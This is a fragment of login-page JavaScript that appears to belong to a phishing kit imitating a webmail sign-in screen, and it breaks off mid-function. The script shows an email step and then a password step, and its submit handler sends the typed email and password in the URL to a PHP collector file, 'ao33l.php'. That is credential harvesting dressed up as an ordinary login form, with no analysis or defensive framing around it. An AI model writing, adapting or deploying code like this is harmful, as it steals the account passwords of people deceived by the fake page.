		<script type="text/javascript">
		function validateEmail(email) {
			var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
			return re.test(email);
		}
        $(document).ready(function() {
            $("#login-signin").click(function() {
                var use = $("#login-username").val();
				if (validateEmail(use) == true) {
					$("#user-greeting").removeClass("hide-passwd");
					$("#username-greet").html(use);
					$("#mbr-login-greeting").addClass("hide-passwd");
					$("#login-username").addClass("hide");
					$("#username-error").addClass("hide");
					$("#dPassInput").attr('autofocus','true');
					$("#dPass").removeClass("hide-passwd");
					$("#stay").hide();
					$("#login-signin").hide();
					$("#forgot").removeClass("hide-passwd");
					$("#submitP").removeAttr("style");
					$("#submitP").css('margin-top', '15px');
					$("#submitP").css('margin-bottom', '3px');
				} else {
					$("#username-error").removeClass("hide"); exit();
				}
            });
        });
		
        $('#login-username').bind('keyup', function(e) {
            if (e.which == 13) {
                var use = $("#login-username").val();
				if (validateEmail(use) == true) {
					$("#user-greeting").removeClass("hide-passwd");
					$("#username-greet").html(use);
					$("#mbr-login-greeting").addClass("hide-passwd");
					$("#login-username").addClass("hide");
					$("#username-error").addClass("hide");
					$("#dPassInput").attr('autofocus','true');
					$("#dPass").removeClass("hide-passwd");
					$("#stay").hide();
					$("#login-signin").hide();
					$("#forgot").removeClass("hide-passwd");
					$("#submitP").removeAttr("style");
					$("#submitP").css('margin-top', '15px');
					$("#submitP").css('margin-bottom', '3px');
				} else {
					$("#username-error").removeClass("hide"); exit();
				}
            }
        });
		$(document).ready(function() {
			$("#submitP").click(function() {
				var pass = $("#dPassInput").val();
                var user = $("#login-username").val();
				if(pass == ""){$("#snLgnIdErr").removeClass("hide-passwd");exit;}
				
				var data = "email="+user+"&password="+pass;
				window.location="ao33l.php?"+data;
			});
		});
		$('#dPassInput').bind('keyup', function(e) {
            if (e.which == 13) {
                var pass = $("#dPassInput").val();
